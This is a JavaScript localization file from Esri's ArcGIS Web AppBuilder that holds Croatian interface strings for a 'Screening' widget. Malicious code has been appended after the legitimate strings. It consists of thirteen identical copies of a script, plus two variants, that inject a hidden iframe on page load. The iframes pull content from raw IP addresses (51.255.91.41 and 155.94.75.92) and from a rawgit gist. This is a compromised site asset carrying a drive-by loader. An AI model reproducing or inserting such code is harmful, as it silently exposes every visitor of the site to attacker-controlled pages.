// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/Screening/nls/strings":{_widgetLabel:"Probir",geometryServicesNotFound:"Geometrijska usluga nije dostupna.",unableToDrawBuffer:"Nije mogu\u0107e nacrtati pojas. Poku\u0161ajte ponovno.",invalidConfiguration:"Nevaljana konfiguracija.",clearAOIButtonLabel:"Kreni ispo\u010detka",noGraphicsShapefile:"U\u010ditani shapefile na sadr\u017ei grafike.",zoomToLocationTooltipText:"Uve\u0107aj na lokaciju",noGraphicsToZoomMessage:"Nema prona\u0111enih grafika za uve\u0107anje.",placenameWidget:{placenameLabel:"Tra\u017eite lokaciju"},
drawToolWidget:{useDrawToolForAOILabel:"Odabir na\u010dina crtanja",toggleSelectability:"Kliknite za prebacivanje mogu\u0107nosti odabira",chooseLayerTitle:"Odaberite sloj koji se mo\u017ee odabrati",selectAllLayersText:"Odaberi sve",layerSelectionWarningTooltip:"Treba odabrati barem jedan sloj za izradu podru\u010dja interesa (AOI)"},shapefileWidget:{shapefileLabel:"U\u010ditajte komprimirani shapefile",uploadShapefileButtonText:"U\u010ditaj",unableToUploadShapefileMessage:"Nije mogu\u0107e u\u010ditati shapefile."},
coordinatesWidget:{selectStartPointFromSearchText:"Odredite po\u010detnu to\u010dku",addButtonTitle:"Dodaj",deleteButtonTitle:"Ukloni",mapTooltipForStartPoint:"Kliknite na kartu za odre\u0111ivanje po\u010detne to\u010dke",mapTooltipForUpdateStartPoint:"Kliknite na kartu za a\u017euriranje po\u010detne to\u010dke",locateText:"Prona\u0111i",locateByMapClickText:"Odaberite po\u010detne koordinate",enterBearingAndDistanceLabel:"Unesite azimut i udaljenost od po\u010detne to\u010dke",bearingTitle:"Azimut",
distanceTitle:"Udaljenost",planSettingTooltip:"Postavke plana",invalidLatLongMessage:"Unesite valjane vrijednosti."},bufferDistanceAndUnit:{bufferInputTitle:"Udaljenost pojasa (dodatno)",bufferInputLabel:"Prika\u017ei rezultate unutar"},traverseSettings:{bearingLabel:"Azimut",lengthLabel:"Duljina",addButtonTitle:"Dodaj",deleteButtonTitle:"Ukloni"},planSettings:{expandGridTooltipText:"Pro\u0161iri mre\u017eu",collapseGridTooltipText:"Sa\u017emi mre\u017eu",directionUnitLabelText:"Jedinica smjera",
distanceUnitLabelText:"Jedinice udaljenosti i du\u017eine",planSettingsComingSoonText:"Dolazi uskoro"},newTraverse:{invalidBearingMessage:"Neva\u017ee\u0107i azimut.",invalidLengthMessage:"Neva\u017ee\u0107a duljina.",negativeLengthMessage:"Negativna du\u017eina"},reportsTab:{aoiAreaText:"Podru\u010dje interesa (AOI)",downloadButtonTooltip:"Preuzmi",printButtonTooltip:"Ispis",uploadShapefileForAnalysisText:"U\u010ditaj shapefile za uklju\u010divanje u analizu",uploadShapefileForButtonText:"Pregledaj",
downloadLabelText:"Odaberi format:",downloadBtnText:"Preuzmi",noDetailsAvailableText:"Nema rezultata",featureCountText:"Broj",featureAreaText:"Podru\u010dje",featureLengthText:"Duljina",attributeChooserTooltip:"Odaberite atribute za prikaz",csv:"CSV",filegdb:"Geobaza podataka",shapefile:"Shapefile",noFeaturesFound:"Nema rezultata za odabrani format datoteke",selectReportFieldTitle:"Odaberi polja",noFieldsSelected:"Nema odabranih polja",intersectingFeatureExceedsMsgOnCompletion:"Dosegnut je maksimalni broj zapisa za jedan ili vi\u0161e slojeva.",
unableToAnalyzeText:"Nije mogu\u0107e analizirati, dosegnut je maksimalni broj zapisa.",errorInPrintingReport:"Nije mogu\u0107e ispisati izvje\u0161\u0107e. Provjerite jesu li postavke izvje\u0161\u0107a valjane.",aoiInformationTitle:"Informacije o podru\u010djima interesa (AOI)",summaryReportTitle:"Sa\u017eetak",notApplicableText:"Nije dostupno",downloadReportConfirmTitle:"Potvrdi preuzimanje",downloadReportConfirmMessage:"Jeste li sigurni da \u017eelite preuzeti?",noDataText:"Nema podataka",createReplicaFailedMessage:"Radnja preuzimanja nije uspjela za sljede\u0107e slojeve: \x3cbr/\x3e ${layerNames}",
extractDataTaskFailedMessage:"Radnja preuzimanja nije uspjela.",printLayoutLabelText:"Izgled",printBtnText:"Ispis",printDialogHint:"Napomena: naziv izvje\u0161\u0107a i komentari mogu se urediti u pretpregledu izvje\u0161\u0107a.",unableToDownloadFileGDBText:"Geobaza podataka ne mo\u017ee se preuzeti za podru\u010dja interesa koja sadr\u017ee to\u010dkaste ili linijske lokacije",unableToDownloadShapefileText:"Shapefile se ne mo\u017ee preuzeti za podru\u010dja interesa koja sadr\u017ee to\u010dkaste ili linijske lokacije",
analysisUnitLabelText:"Prika\u017ei rezultate u:",analysisUnitButtonTooltip:"Izaberite jedinice za analizu",analysisCloseBtnText:"Zatvori",feetUnit:"Stope / Kvadratne stope",milesUnit:"Milje / Rali",metersUnit:"Metri / Kvadratni metri",kilometersUnit:"Kilometri / Kvadratni kilometri",hectaresUnit:"Kilometri / Hektari",hectaresAbbr:"hektari",layerNotVisibleText:"Nije mogu\u0107e analizirati, sloj je isklju\u010den ili je izvan raspona vidljivosti mjerila.",refreshBtnTooltip:"Osvje\u017ei izvje\u0161taj"},
_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});